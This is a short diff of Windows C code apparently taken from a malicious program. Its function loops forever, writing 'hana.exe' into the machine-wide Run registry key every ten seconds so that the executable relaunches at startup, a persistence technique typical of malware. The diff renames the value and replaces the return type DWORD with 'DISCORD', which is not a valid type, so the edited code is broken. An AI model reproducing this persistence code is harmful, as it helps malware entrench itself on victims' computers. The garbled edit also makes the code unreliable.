@@ -52,12 +52,12 @@ CloseHandle(hFile);
 return 0;
 }
  
-DWORD WINAPI reg(){
+DISCORD WINAPI reg(){
 char value[]="hana.exe";
 HKEY hKey;
 while(1){
 RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
-RegSetValueEx(hKey,"Hana",0,REG_SZ,(LPBYTE)value,60);
+RegSetValueEx(hKey,"WHAT",0,REG_SZ,(LPBYTE)value,60);
 RegCloseKey(hKey);
 Sleep(10000);
 }
